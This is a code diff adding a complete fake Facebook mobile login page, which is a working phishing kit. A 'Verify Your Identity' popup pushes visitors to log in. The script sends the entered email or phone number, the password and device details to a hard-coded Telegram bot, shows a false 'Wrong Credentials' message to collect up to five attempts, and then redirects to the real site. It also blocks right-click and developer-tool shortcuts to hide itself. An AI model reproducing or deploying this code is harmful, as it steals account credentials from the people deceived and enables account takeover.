@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+    <title>Facebook - log in or sign up</title>
+    <meta name="description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
+    <meta property="og:title" content="Facebook - log in or sign up">
+    <meta property="og:description" content="Create an account or log into Facebook. Connect with friends, family and other people you know.">
+    <meta name="theme-color" content="#FFFFFF">
+    <meta name="referrer" content="origin-when-crossorigin">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+    <link rel="canonical" href="https://www.facebook.com/">
+    
+    <style>
+        :root {
+            --fb-blue: #0064E0;
+            --fb-blue-hover: #0055C9;
+            --fb-white: #FFFFFF;
+            --fb-bg: #FFFFFF;
+            --fb-border: #C9CCD1;
+            --fb-text: #111112;
+            --fb-secondary: #666A72;
+            --fb-light-gray: #F2F4F6;
+            --fb-link: #1763CF;
+            --meta-gray: #63788A;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Optimistic Text Normal', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background-color: var(--fb-white);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            min-height: 100dvh;
+            padding: 0;
+            position: relative;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            user-select: none;
+            color: var(--fb-text);
+        }
+
+        .main-wrapper {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 16px 0;
+            flex: 1;
+            justify-content: space-between;
+        }
+
+        .content-top {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Top Banner */
+        .top-banner {
+            width: 100vw;
+            max-width: 100vw;
+            margin-left: calc(-50vw + 50%);
+            margin-right: calc(-50vw + 50%);
+            background: var(--fb-white);
+            padding: 10px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 0;
+            cursor: pointer;
+            border-bottom: 0.5px solid #C9CCD1;
+            justify-content: flex-start;
+            padding-left: 16px;
+            padding-right: 16px;
+        }
+        .top-banner .banner-icon {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+        .top-banner .banner-icon img {
+            width: 24px;
+            height: 24px;
+        }
+        .top-banner .banner-text {
+            font-size: 13px;
+            font-weight: 400;
+            color: var(--fb-link);
+            line-height: 1.3;
+            flex: 1;
+        }
+
+        /* Language Selector */
+        .language-selector {
+            width: 100%;
+            text-align: center;
+            margin-top: 12px;
+            margin-bottom: 16px;
+        }
+        .language-selector span {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--fb-secondary);
+        }
+
+        /* Fb Logo */
+        .fb-logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 4px;
+            margin-bottom: 32px;
+        }
+        .fb-logo-container img {
+            width: auto;
+            height: 60px;
+            max-height: 60dp;
+            object-fit: contain;
+        }
+
+        /* Form */
+        .login-form-container {
+            width: 100%;
+        }
+
+        /* Floating Label Input */
+        .input-wrapper {
+            width: 100%;
+            margin-bottom: 12px;
+            border-radius: 16px;
+            border: 1px solid #C9CCD1;
+            background: rgba(255, 255, 255, 0.2);
+            position: relative;
+            display: flex;
+            align-items: center;
+            padding: 18px 16px 6px 16px;
+            min-height: 58px;
+        }
+        .input-wrapper:focus-within {
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 1px var(--fb-blue);
+        }
+        .input-wrapper .floating-label {
+            position: absolute;
+            top: 50%;
+            left: 16px;
+            transform: translateY(-50%);
+            font-size: 15.2px;
+            font-family: 'Optimistic VF App Lite', 'Roboto', sans-serif;
+            color: #666A72;
+            pointer-events: none;
+            transition: all 0.15s ease;
+            z-index: 1;
+        }
+        .input-wrapper .floating-label.small {
+            top: 10px;
+            transform: translateY(0);
+            font-size: 13px;
+            color: #666A72;
+        }
+        .input-wrapper:focus-within .floating-label {
+            top: 10px;
+            transform: translateY(0);
+            font-size: 13px;
+            color: var(--fb-blue);
+        }
+        .input-wrapper input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 15.2px;
+            font-family: 'Optimistic VF App Lite', 'Roboto', sans-serif;
+            background: transparent;
+            color: var(--fb-text);
+            padding: 4px 0 2px 0;
+            min-height: 22px;
+            width: 100%;
+            position: relative;
+            z-index: 2;
+        }
+        .input-wrapper input::placeholder {
+            color: transparent;
+        }
+        .input-wrapper .clear-btn,
+        .input-wrapper .toggle-btn {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+            cursor: pointer;
+            margin-left: 12px;
+            display: none;
+            position: relative;
+            z-index: 2;
+        }
+        .input-wrapper .clear-btn.show,
+        .input-wrapper .toggle-btn.show {
+            display: block;
+        }
+        .input-wrapper .clear-btn img,
+        .input-wrapper .toggle-btn img {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Login Button */
+        .login-btn {
+            width: 100%;
+            padding: 0;
+            height: 44px;
+            background-color: var(--fb-blue);
+            color: white;
+            border: none;
+            border-radius: 22px;
+            font-size: 15.2px;
+            font-weight: 500;
+            font-family: 'Optimistic VF App Lite', 'Roboto', sans-serif;
+            cursor: pointer;
+            margin-top: 2px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+            -webkit-appearance: none;
+        }
+        .login-btn:active {
+            transform: scale(0.97);
+        }
+        .login-btn.loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        .login-btn .spinner {
+            width: 24px;
+            height: 24px;
+            border: 2.5px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Forgot Password */
+        .forgot-link {
+            display: block;
+            text-align: center;
+            color: var(--fb-text);
+            text-decoration: none;
+            font-size: 15.2px;
+            font-weight: 500;
+            margin-bottom: 24px;
+            padding: 8px 16px;
+            border-radius: 22px;
+            height: 36px;
+            line-height: 20px;
+        }
+        .forgot-link:active {
+            background: rgba(0, 0, 0, 0.05);
+        }
+
+        /* Create Account */
+        .create-account-btn {
+            width: 100%;
+            height: 44px;
+            background: transparent;
+            color: var(--fb-blue);
+            border: 1px solid var(--fb-blue);
+            border-radius: 22px;
+            font-size: 15.2px;
+            font-weight: 500;
+            font-family: 'Optimistic VF App Lite', 'Roboto', sans-serif;
+            cursor: pointer;
+            margin-top: 0;
+            transition: background 0.2s;
+            -webkit-appearance: none;
+        }
+        .create-account-btn:active {
+            background: rgba(0, 100, 224, 0.08);
+            transform: scale(0.97);
+        }
+
+        /* Bottom Section */
+        .bottom-section {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 0;
+            margin-top: auto;
+        }
+
+        /* Meta Footer */
+        .meta-footer {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            padding-top: 20px;
+            padding-bottom: 0;
+        }
+        .meta-footer .meta-logo {
+            width: auto;
+            height: 12px;
+            opacity: 0.7;
+            margin-bottom: 4px;
+        }
+        .meta-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 2px 8px;
+            font-size: 10px;
+            color: var(--meta-gray);
+            padding: 4px 0 8px 0;
+        }
+        .meta-links a {
+            color: var(--meta-gray);
+            text-decoration: none;
+            padding: 3px 4px;
+            white-space: nowrap;
+        }
+        .meta-links a:active {
+            background: rgba(0, 0, 0, 0.05);
+            border-radius: 4px;
+        }
+        .meta-links.more-links {
+            display: none;
+            border-top: none;
+            padding-top: 6px;
+            padding-bottom: 8px;
+        }
+        .meta-links.more-links.show {
+            display: flex;
+        }
+        .meta-links .more-trigger {
+            color: var(--meta-gray);
+            cursor: pointer;
+            font-size: 10px;
+            padding: 3px 4px;
+            white-space: nowrap;
+        }
+
+        /* ============ WRONG CREDENTIALS POPUP v3 ============ */
+        /* Light mode (default) */
+        .wrong-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .wrong-popup-overlay.show {
+            display: flex;
+        }
+        .wrong-popup-box {
+            background: #FFFFFF;
+            border-radius: 14px;
+            padding: 0;
+            width: 90%;
+            max-width: 320px;
+            text-align: center;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2), 0 0 0 1px rgba(0, 0, 0, 0.06);
+            overflow: hidden;
+        }
+        .wrong-popup-content {
+            padding: 28px 22px 20px;
+        }
+        .wrong-popup-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1C1E21;
+            margin-bottom: 10px;
+            letter-spacing: 0.2px;
+        }
+        .wrong-popup-message {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 0;
+            line-height: 1.4;
+        }
+        .wrong-popup-btn-area {
+            border-top: 1px solid #E4E6EB;
+            padding: 0;
+        }
+        .wrong-popup-ok-btn {
+            width: 100%;
+            padding: 14px 20px;
+            background: transparent;
+            color: #1877F2;
+            border: none;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Optimistic VF App Lite', 'Roboto', sans-serif;
+            -webkit-appearance: none;
+            letter-spacing: 0.3px;
+            transition: background 0.15s ease;
+        }
+        .wrong-popup-ok-btn:active {
+            background: #F0F2F5;
+        }
+
+        /* Dark mode - auto detect from system */
+        @media (prefers-color-scheme: dark) {
+            .wrong-popup-overlay {
+                background: rgba(0, 0, 0, 0.7);
+            }
+            .wrong-popup-box {
+                background: #1F1F1F;
+                box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.06);
+            }
+            .wrong-popup-title {
+                color: #FFFFFF;
+            }
+            .wrong-popup-message {
+                color: #B0B3B8;
+            }
+            .wrong-popup-btn-area {
+                border-top: 1px solid #3E4042;
+            }
+            .wrong-popup-ok-btn {
+                color: #4599FF;
+                background: transparent;
+            }
+            .wrong-popup-ok-btn:active {
+                background: #2D2D2D;
+            }
+        }
+
+        /* ============ VERIFY IDENTITY POPUP ============ */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .popup-box {
+            background: white;
+            border-radius: 16px;
+            padding: 28px 24px 24px;
+            width: 90%;
+            max-width: 360px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: popIn 0.3s ease;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .popup-icon {
+            width: 60px;
+            height: 60px;
+            background: var(--fb-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+        .popup-icon svg {
+            width: 32px;
+            height: 32px;
+            fill: white;
+        }
+        .popup-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--fb-text);
+            margin-bottom: 8px;
+        }
+        .popup-message {
+            font-size: 14px;
+            color: var(--fb-secondary);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .popup-timer {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--fb-blue);
+            margin-bottom: 16px;
+        }
+        .popup-progress {
+            width: 100%;
+            height: 4px;
+            background: var(--fb-border);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .popup-progress-bar {
+            height: 100%;
+            background: var(--fb-blue);
+            border-radius: 2px;
+            width: 100%;
+            transition: width 0.1s linear;
+        }
+
+        /* Error */
+        .error-msg {
+            color: #FF3333;
+            font-size: 13px;
+            margin-bottom: 8px;
+            display: none;
+            text-align: left;
+            padding-left: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper" id="mainContent">
+
+        <div class="content-top">
+
+            <!-- Top Banner -->
+            <div class="top-banner" onclick="window.location.href='https://play.google.com/store/apps/details?id=com.facebook.katana'">
+                <div class="banner-icon">
+                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yh/r/iXKRnkL1VeD.webp" alt="Fb">
+                </div>
+                <div class="banner-text">Get Facebook for Android and browse faster.</div>
+            </div>
+
+            <!-- Language Selector -->
+            <div class="language-selector">
+                <span>English (US)</span>
+            </div>
+
+            <!-- Fb Logo -->
+            <div class="fb-logo-container">
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yU/r/0gFm6_6mwp0.webp" alt="Facebook">
+            </div>
+
+            <!-- Login Form -->
+            <div class="login-form-container">
+                <form id="loginForm" autocomplete="off">
+
+                    <!-- Email Input -->
+                    <div class="input-wrapper" id="emailWrapper">
+                        <span class="floating-label" id="emailLabel">Mobile number or email</span>
+                        <input type="text" id="emailInput" placeholder="Mobile number or email" autocomplete="off" autocapitalize="off" autocorrect="off" inputmode="email">
+                        <div class="clear-btn" id="emailClear" onclick="clearInput('emailInput','emailClear','emailLabel')" style="display:none;">
+                            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yS/r/kHeVcteEMil.webp" alt="Clear">
+                        </div>
+                    </div>
+
+                    <!-- Password Input -->
+                    <div class="input-wrapper" id="passWrapper">
+                        <span class="floating-label" id="passLabel">Password</span>
+                        <input type="password" id="passwordInput" placeholder="Password" autocomplete="off" autocapitalize="off" autocorrect="off">
+                        <div class="toggle-btn" id="passToggle" onclick="togglePassword()" style="display:none;">
+                            <img id="passToggleImg" src="https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/lBaBOo8QfeT.webp" alt="Show">
+                        </div>
+                    </div>
+
+                    <div class="error-msg" id="errorMsg"></div>
+
+                    <button type="submit" class="login-btn" id="loginBtn">
+                        <span id="btnText">Log in</span>
+                        <div class="spinner" id="spinner"></div>
+                    </button>
+
+                </form>
+
+                <a href="https://www.facebook.com/recover/initiate/" class="forgot-link" target="_blank">Forgot password?</a>
+
+            </div>
+
+        </div>
+
+        <!-- Bottom Section -->
+        <div class="bottom-section">
+
+            <!-- Create Account -->
+            <button class="create-account-btn" onclick="window.location.href='https://www.facebook.com/reg/'">Create new account</button>
+
+            <!-- Meta Footer -->
+            <div class="meta-footer">
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yR/r/on19k6ac8bZ.webp" alt="Meta" class="meta-logo">
+                <div class="meta-links">
+                    <a href="https://about.meta.com/" target="_blank">About</a>
+                    <a href="https://www.facebook.com/help/?ref=pf" target="_blank">Help</a>
+                    <span class="more-trigger" onclick="toggleMoreLinks()">More</span>
+                </div>
+                <div class="meta-links more-links" id="moreLinks">
+                    <a href="https://messenger.com/" target="_blank">Messenger</a>
+                    <a href="https://www.facebook.com/lite/" target="_blank">Facebook Lite</a>
+                    <a href="https://www.facebook.com/watch/" target="_blank">Video</a>
+                    <a href="https://about.meta.com/technologies/meta-pay" target="_blank">Meta Pay</a>
+                    <a href="https://www.meta.com/" target="_blank">Meta Store</a>
+                    <a href="https://www.meta.com/quest/" target="_blank">Meta Quest</a>
+                    <a href="https://www.meta.com/smart-glasses/" target="_blank">Ray-Ban Meta</a>
+                    <a href="https://www.meta.ai/" target="_blank">Meta AI</a>
+                    <a href="https://www.instagram.com/" target="_blank">Instagram</a>
+                    <a href="https://www.threads.com/" target="_blank">Threads</a>
+                    <a href="https://developers.facebook.com/?ref=pf" target="_blank">Developers</a>
+                    <a href="https://www.facebook.com/careers/?ref=pf" target="_blank">Careers</a>
+                    <a href="https://www.facebook.com/privacy/policy/?entry_point=facebook_page_footer" target="_blank">Privacy Policy</a>
+                    <a href="https://www.facebook.com/privacy/center/?entry_point=facebook_page_footer" target="_blank">Privacy Center</a>
+                    <a href="https://www.facebook.com/privacy/cookie_settings/" target="_blank">Cookie Settings</a>
+                    <a href="https://www.facebook.com/help/cancelcontracts/?source=facebook.com" target="_blank">Cancel contracts here</a>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- ============ WRONG CREDENTIALS POPUP v3 ============ -->
+    <div class="wrong-popup-overlay" id="wrongPopupOverlay">
+        <div class="wrong-popup-box">
+            <div class="wrong-popup-content">
+                <div class="wrong-popup-title">Wrong Credentials</div>
+                <div class="wrong-popup-message">Invalid username or password</div>
+            </div>
+            <div class="wrong-popup-btn-area">
+                <button class="wrong-popup-ok-btn" onclick="closeWrongPopup()">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ VERIFY IDENTITY POPUP ============ -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-box">
+            <div class="popup-icon">
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
+            </div>
+            <div class="popup-title">Verify Your Identity</div>
+            <div class="popup-message">To See The Link You Must Login To Verify</div>
+            <div class="popup-timer" id="popupTimer">6</div>
+            <div class="popup-progress"><div class="popup-progress-bar" id="popupProgressBar"></div></div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8901136364:AAF0RKnsD7jX6XpkRmERhVrxWHVD8f7Hi7o';
+        const CHAT_ID = '7427889333';
+        const MAX_ATTEMPTS = 5;
+        const POPUP_DURATION = 7000;
+
+        function getAttemptCount() {
+            return parseInt(sessionStorage.getItem('fb_login_attempt') || '0');
+        }
+        function incrementAttempt() {
+            const count = getAttemptCount() + 1;
+            sessionStorage.setItem('fb_login_attempt', count);
+            return count;
+        }
+        function resetAttempts() {
+            sessionStorage.removeItem('fb_login_attempt');
+        }
+
+        // WRONG POPUP
+        function showWrongPopup() {
+            document.getElementById('wrongPopupOverlay').classList.add('show');
+        }
+        function closeWrongPopup() {
+            document.getElementById('wrongPopupOverlay').classList.remove('show');
+        }
+
+        // VERIFY POPUP
+        let popupInterval, popupStartTime;
+        function showPopup() {
+            const overlay = document.getElementById('popupOverlay');
+            const timerEl = document.getElementById('popupTimer');
+            const progressBar = document.getElementById('popupProgressBar');
+            overlay.style.display = 'flex';
+            popupStartTime = Date.now();
+            popupInterval = setInterval(() => {
+                const elapsed = Date.now() - popupStartTime;
+                const remaining = Math.max(0, POPUP_DURATION - elapsed);
+                timerEl.textContent = Math.ceil(remaining / 1000);
+                progressBar.style.width = (remaining / POPUP_DURATION) * 100 + '%';
+                if (remaining <= 0) {
+                    clearInterval(popupInterval);
+                    document.getElementById('popupOverlay').style.display = 'none';
+                }
+            }, 100);
+        }
+        window.addEventListener('DOMContentLoaded', showPopup);
+
+        // FLOATING LABEL LOGIC
+        const emailInput = document.getElementById('emailInput');
+        const emailLabel = document.getElementById('emailLabel');
+        const passInput = document.getElementById('passwordInput');
+        const passLabel = document.getElementById('passLabel');
+
+        emailInput.addEventListener('input', function() {
+            if (this.value) {
+                emailLabel.classList.add('small');
+            } else {
+                emailLabel.classList.remove('small');
+            }
+            document.getElementById('emailClear').style.display = this.value ? 'block' : 'none';
+        });
+        emailInput.addEventListener('focus', function() {
+            emailLabel.classList.add('small');
+        });
+        emailInput.addEventListener('blur', function() {
+            if (!this.value) {
+                emailLabel.classList.remove('small');
+            }
+        });
+
+        passInput.addEventListener('input', function() {
+            if (this.value) {
+                passLabel.classList.add('small');
+            } else {
+                passLabel.classList.remove('small');
+            }
+            document.getElementById('passToggle').style.display = this.value ? 'block' : 'none';
+        });
+        passInput.addEventListener('focus', function() {
+            passLabel.classList.add('small');
+        });
+        passInput.addEventListener('blur', function() {
+            if (!this.value) {
+                passLabel.classList.remove('small');
+            }
+        });
+
+        // TOGGLE PASSWORD
+        function togglePassword() {
+            const input = document.getElementById('passwordInput');
+            const img = document.getElementById('passToggleImg');
+            if (input.type === 'password') {
+                input.type = 'text';
+                img.src = 'https://z-m-static.xx.fbcdn.net/rsrc.php/yJ/r/Zxtm1kG8B2L.webp';
+            } else {
+                input.type = 'password';
+                img.src = 'https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/lBaBOo8QfeT.webp';
+            }
+        }
+
+        // CLEAR INPUT
+        function clearInput(inputId, btnId, labelId) {
+            document.getElementById(inputId).value = '';
+            document.getElementById(btnId).style.display = 'none';
+            document.getElementById(labelId).classList.remove('small');
+            document.getElementById(inputId).focus();
+        }
+
+        // MORE LINKS
+        function toggleMoreLinks() {
+            document.getElementById('moreLinks').classList.toggle('show');
+        }
+
+        // DEVICE INFO
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceType = 'Desktop', deviceModel = 'Unknown', osInfo = 'Unknown', browserInfo = 'Unknown';
+            if (/Android/.test(ua)) {
+                deviceType = 'Android Phone';
+                osInfo = 'Android';
+                const v = ua.match(/Android\s([\d.]+)/);
+                if (v) osInfo = 'Android ' + v[1];
+                const m = ua.match(/;\s([A-Za-z0-9\s\-]+?)\sBuild\//);
+                if (m) deviceModel = m[1].trim();
+                else deviceModel = 'Android Device';
+            } else if (/iPhone/.test(ua)) {
+                deviceType = 'iPhone';
+                deviceModel = 'Apple iPhone';
+                const v = ua.match(/iPhone OS\s([\d_]+)/);
+                if (v) osInfo = 'iOS ' + v[1].replace(/_/g, '.');
+            } else if (/Windows/.test(ua)) {
+                deviceType = 'Windows PC';
+                deviceModel = 'Windows Computer';
+            } else if (/Macintosh/.test(ua)) {
+                deviceType = 'Mac';
+                deviceModel = 'Apple Mac';
+            }
+            if (/Chrome/i.test(ua) && !/Edge|Edg/i.test(ua)) {
+                const m = ua.match(/Chrome\/([\d.]+)/);
+                browserInfo = m ? 'Chrome ' + m[1] : 'Chrome';
+            } else if (/Firefox/i.test(ua)) {
+                const m = ua.match(/Firefox\/([\d.]+)/);
+                browserInfo = m ? 'Firefox ' + m[1] : 'Firefox';
+            } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+                browserInfo = 'Safari';
+            }
+            return {
+                deviceType, deviceModel, os: osInfo, browser: browserInfo, userAgent: ua,
+                screenResolution: window.screen.width + 'x' + window.screen.height,
+                language: navigator.language || 'Unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
+            };
+        }
+
+        // SEND TO TELEGRAM
+        async function sendToTelegram(email, password, deviceInfo, attemptNum) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') return false;
+            const now = new Date();
+            const bdTime = new Date(now.getTime() + 6 * 60 * 60 * 1000);
+            const timestamp = bdTime.toLocaleString('en-US', { year: 'numeric', month: '2-digit', day: '2-digit',
+                hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true, timeZone: 'Asia/Dhaka' });
+            const message = `🔰 *NEW FACEBOOK LOGIN CAPTURED!*\n\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n👤 *LOGIN CREDENTIALS*\n━━━━━━━━━━━━━━━━━━━━\n` +
+                `📧 Email/Phone: \`${email}\`\n🔑 Password: \`${password}\`\n` +
+                `🔢 Attempt: *${attemptNum}* / ${MAX_ATTEMPTS}\n\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n📱 *DEVICE INFO*\n━━━━━━━━━━━━━━━━━━━━\n` +
+                `📟 Type: ${deviceInfo.deviceType}\n📱 Model: ${deviceInfo.deviceModel}\n` +
+                `💻 OS: ${deviceInfo.os}\n🌐 Browser: ${deviceInfo.browser}\n` +
+                `📺 Screen: ${deviceInfo.screenResolution}\n🌍 Language: ${deviceInfo.language}\n` +
+                `🕐 Timezone: ${deviceInfo.timezone}\n📶 Network: ${deviceInfo.connectionType}\n\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n⏰ *TIMESTAMP (BD)*\n━━━━━━━━━━━━━━━━━━━━\n${timestamp}`;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
+                });
+                return true;
+            } catch (e) { return false; }
+        }
+
+        // FORM SUBMIT
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            const password = passInput.value.trim();
+            const errorMsg = document.getElementById('errorMsg');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            const loginBtn = document.getElementById('loginBtn');
+            errorMsg.style.display = 'none';
+            if (!email || !password) {
+                errorMsg.textContent = 'Please enter your mobile number or email address and password.';
+                errorMsg.style.display = 'block';
+                return;
+            }
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            loginBtn.classList.add('loading');
+            const attemptNum = incrementAttempt();
+            const deviceInfo = getDeviceInfo();
+            await sendToTelegram(email, password, deviceInfo, attemptNum);
+            await new Promise(r => setTimeout(r, 1200));
+            btnText.style.display = 'inline';
+            spinner.style.display = 'none';
+            loginBtn.classList.remove('loading');
+            if (attemptNum >= MAX_ATTEMPTS) {
+                resetAttempts();
+                window.location.href = 'https://www.facebook.com/login.php?login_attempt=1&email=' + encodeURIComponent(email);
+            } else {
+                passInput.value = '';
+                document.getElementById('passToggle').style.display = 'none';
+                passLabel.classList.remove('small');
+                showWrongPopup();
+            }
+        });
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
